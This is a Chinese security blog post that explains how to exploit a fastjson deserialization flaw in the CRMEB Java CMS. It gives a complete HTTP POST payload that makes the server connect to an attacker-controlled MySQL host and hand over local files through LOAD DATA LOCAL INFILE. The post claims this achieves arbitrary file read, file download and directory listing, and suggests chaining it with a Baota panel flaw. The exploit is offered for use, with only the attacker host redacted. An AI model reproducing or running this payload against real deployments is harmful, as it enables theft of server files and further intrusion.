---
title: crmeb java版本CMS fastjson利用 - sevck
url: https://www.cnblogs.com/sevck/p/17467287.html
source: 博客园 - sevck
date: 2023-06-09
fetch_date: 2025-10-04T11:44:43.806985
---

# crmeb java版本CMS fastjson利用 - sevck

* [![博客园logo](//assets.cnblogs.com/logo.svg)](https://www.cnblogs.com/ "开发者的网上家园")
* [会员](https://cnblogs.vip/)
* [众包](https://www.cnblogs.com/cmt/p/18500368)
* [新闻](https://news.cnblogs.com/)
* [博问](https://q.cnblogs.com/)
* [闪存](https://ing.cnblogs.com/)
* [赞助商](https://www.cnblogs.com/cmt/p/19081960)
* [HarmonyOS](https://harmonyos.cnblogs.com/)
* [Chat2DB](https://chat2db-ai.com/)

* ![搜索](//assets.cnblogs.com/icons/search.svg)
  ![搜索](//assets.cnblogs.com/icons/enter.svg)
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    所有博客
  + ![搜索](//assets.cnblogs.com/icons/search.svg)

    当前博客
* [![写随笔](//assets.cnblogs.com/icons/newpost.svg)](https://i.cnblogs.com/EditPosts.aspx?opt=1 "写随笔")
  [![我的博客](//assets.cnblogs.com/icons/myblog.svg)](https://passport.cnblogs.com/GetBlogApplyStatus.aspx "我的博客")
  [![短消息](//assets.cnblogs.com/icons/message.svg)](https://msg.cnblogs.com/ "短消息")
  ![简洁模式](//assets.cnblogs.com/icons/lite-mode-on.svg)

  [![用户头像](//assets.cnblogs.com/icons/avatar-default.svg)](https://home.cnblogs.com/)

  [我的博客](https://passport.cnblogs.com/GetBlogApplyStatus.aspx)
  [我的园子](https://home.cnblogs.com/)
  [账号设置](https://account.cnblogs.com/settings/account)
  [会员中心](https://vip.cnblogs.com/my)
  简洁模式 ...
  退出登录

  [注册](https://account.cnblogs.com/signup)
  登录

[![返回主页](/skins/custom/images/logo.gif)](https://www.cnblogs.com/sevck/)

# [Sevck's Blog](https://www.cnblogs.com/sevck)

## 关注互联网安全，软件开发，这里记录着我的渗透心得、开发文摘、随笔心情(Linux,Windows,Python,Java.Lua,JS,C++在学习)。JAVA安全网:https://www.javasec.cn

* [新随笔](https://i.cnblogs.com/EditPosts.aspx?opt=1)
* 订阅
* [管理](https://i.cnblogs.com/)

# [crmeb java版本CMS fastjson利用](https://www.cnblogs.com/sevck/p/17467287.html "发布于 2023-06-08 17:50")

4.5K start 2K fork的项目，之前用了低版本的fastjson，新版本修复了。

https://gitee.com/ZhongBangKeJi/crmeb\_java

之前用1.2.56版本fastjson，1.2.68公开的有fastjson commons-io AutoCloseable写任意文件，本地测payload没问题，真实场景利用不了

引用su18: https://github.com/su18/fastjson-commons-io/tree/e6724ac297e1aa7ae44a62a3ad6cc3f537d3c737

注意：由于 fastjson 获取 WriterOutputStream 的构造方法时并不唯一，所以这个 payload 并不是每次都能触发，需要等随机到带有指定参数的构造方法才能触发，测试的小伙伴多测几次就可以写入了。如果你有解决这个问题的办法请联系我。

springboot来说也有点鸡肋，在blackhat 2021有人提出了新的姿势：

https://blog.noah.360.net/blackhat-2021yi-ti-xiang-xi-fen-xi-fastjsonfan-xu-lie-hua-lou-dong-ji-zai-qu-kuai-lian-ying-yong-zhong-de-shen-tou-li-yong-2/

刚好可以配合mysql的jdbc，让fastjson主动去链接我的mysql，根据已学知识，我们在继续构造payload，再利用"allowUrlInLocalInfile":"true","allowLoadLocalInfile":"true",***"allowLoadLocalInfileInPath":"/",***

可以构成任意文件读取&&任意文件下载，下载jar包，，利用file:// 可以做到列目录，再与宝塔漏洞再进行利用无敌。

show code:

```
POST /api/public/wechat/gitlab?token=aa HTTP/1.1
Host: 192.168.220.2:8081
Content-Length: 479
Request-Origion: SwaggerBootstrapUi
Accept: */*
X-Requested-With: XMLHttpRequest
Authori-zation:
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Content-Type: application/json
Origin: http://192.168.220.2:8081
Referer: http://192.168.220.2:8081/doc.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{"@type":"java.lang.AutoCloseable", "@type":"com.mysql.jdbc.JDBC4Connection","hostToConnectTo":"xxxxx","portToConnectTo":1234,"databaseToConnectTo":"test","info": {"@type":"java.util.Properties","PORT":"1234",
"allowUrlInLocalInfile":"true",
"allowLoadLocalInfile":"true",
"allowLoadLocalInfileInPath":"/",
"maxAllowedPacket":"655360",
"user":"fileread_file:///.","PORT.1":"1234","HOST.1":"xxxxxxxxx","NUM_HOSTS":"1","HOST":"xxxxx","DBNAME":"test"}
```

![](https://img2023.cnblogs.com/blog/737185/202306/737185-20230608174757025-1560144151.png)

![](https://img2023.cnblogs.com/blog/737185/202306/737185-20230608174639335-1101021626.png)

【版权所有@Sevck 博客地址http://www.cnblogs.com/sevck】 可以转载，注明出处.

posted @
2023-06-08 17:50
[sevck](https://www.cnblogs.com/sevck)
阅读(696)
评论(0)

收藏
举报

刷新页面[返回顶部](#top)

[![](https://img2024.cnblogs.com/blog/35695/202508/35695-20250830121216742-1062949948.jpg)](https://developer.huawei.com/consumer/cn/activity/digixActivity/digixcmsdetail/101750143863263087?ha_source=BKYQ3&ha_sourceId=89000408)

### 公告

[![](https://img2024.cnblogs.com/blog/35695/202509/35695-20250923174722171-270282128.jpg)](https://qoder.com/)

[博客园](https://www.cnblogs.com/)
  ©  2004-2025

[![](//assets.cnblogs.com/images/ghs.png)浙公网安备 33010602011771号](http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=33010602011771)
[浙ICP备2021040463号-3](https://beian.miit.gov.cn)